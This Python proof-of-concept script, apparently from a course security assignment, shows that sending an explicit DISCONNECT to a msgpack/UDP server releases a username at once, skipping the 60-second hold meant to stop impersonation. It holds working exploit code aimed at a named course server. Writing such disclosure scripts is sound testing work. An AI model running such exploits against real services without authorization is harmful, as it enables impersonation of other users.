"""
VULN-04: Explicit DISCONNECT bypasses the 60-second username hold period
=========================================================================
The spec requires that a cleartext username is held for 60 seconds after
a session ends, to prevent immediate impersonation. This hold is only
enforced when the session is abandoned (socket closed without DISCONNECT).

When a user sends an explicit DISCONNECT (request_type 2), the server
releases the username immediately — the hold window is skipped entirely.
A second user can claim the same name before the 60-second window expires.

Impact:
  - Any user can vacate and re-register a username in the same instant
  - A second user (or the same user reconnecting) can grab it immediately
  - The 60-second impersonation protection is effectively opt-out:
    any client that sends DISCONNECT bypasses it entirely

Run: uv run python vulnerabilities/poc_04_username_reclaim.py
"""
import socket, msgpack, random, time

HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    h = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': h}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)


def main():
    target = f'clear-usr{random.randint(1000, 9999)}'
    print(f'Target username: {target}\n')

    # --- Phase 1: User A claims the username then explicitly DISCONNECTs ---
    sock_a, sess_a = connect()
    r = req(sock_a, {'request_type': 13, 'session': sess_a,
                     'request_handle': h(), 'username': target})
    assert r and r.get(b'response_type') == 34, 'Could not set username'
    print(f'[User A] Claimed: {target}')

    req(sock_a, {'request_type': 2, 'session': sess_a, 'request_handle': h()})
    sock_a.close()
    print(f'[User A] Sent DISCONNECT and closed socket')

    # --- Phase 2: User B immediately claims the same username ---
    sock_b, sess_b = connect()
    r2 = req(sock_b, {'request_type': 13, 'session': sess_b,
                      'request_handle': h(), 'username': target})
    success = r2 and r2.get(b'response_type') == 34
    error   = r2.get(b'error', b'').decode() if r2 and not success else ''
    print(f'[User B] Immediate reclaim: {"SUCCESS — " + target if success else "FAILED (" + error + ")"}')
    sock_b.close()

    print(f'\n{"="*60}')
    if success:
        print('CONFIRMED: DISCONNECT releases username immediately.')
        print('The 60-second hold period is bypassed for clean disconnects.')
        print()
        print('Expected behaviour: hold period should apply regardless of')
        print('whether the session ended via DISCONNECT or socket abandonment.')
    else:
        print('Hold period enforced even after explicit DISCONNECT.')


if __name__ == '__main__':
    main()
